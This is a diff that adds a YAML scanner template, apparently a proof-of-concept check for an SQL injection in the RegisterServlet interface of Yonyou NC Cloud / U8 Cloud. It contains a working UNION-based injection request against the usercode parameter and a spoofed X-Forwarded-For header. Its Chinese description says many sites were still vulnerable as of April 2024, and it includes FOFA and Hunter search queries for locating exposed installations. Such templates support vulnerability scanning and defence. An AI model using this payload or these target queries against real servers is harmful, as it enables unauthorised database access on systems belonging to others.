@@ -1,0 +1,17 @@
+name: yonyouNC-U8C-sqli        
+rules: 
+  - method: GET   
+    path: /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd  #sqlserver
+    headers:
+      Cookie: JSESSIONID=D523370AE42E1D2363160250C914E62A.server
+      X-Forwarded-For: 127.0.0.1
+    body:             
+    expression:                        
+      status_code: 200                 
+      response_header:              
+      response_body: invalid UFDate                      
+detail:                          
+  description: "用友NC Cloud，大型企业数字化平台，聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现人、财、物、客的全面数字化。用友NC Cloud nc.bs.sm.login2.RegisterServlet接口存在SQL注入,截止到2024.4.27仍存在很多该漏洞网站"
+  search:             
+    fofa: body="UClient.dmg"||app="用友-U8-Cloud"
+    鹰图: web.body="http://uclient.yonyou.com/api/uclient/public/download/windows" or web.body="请下载新版UClient"
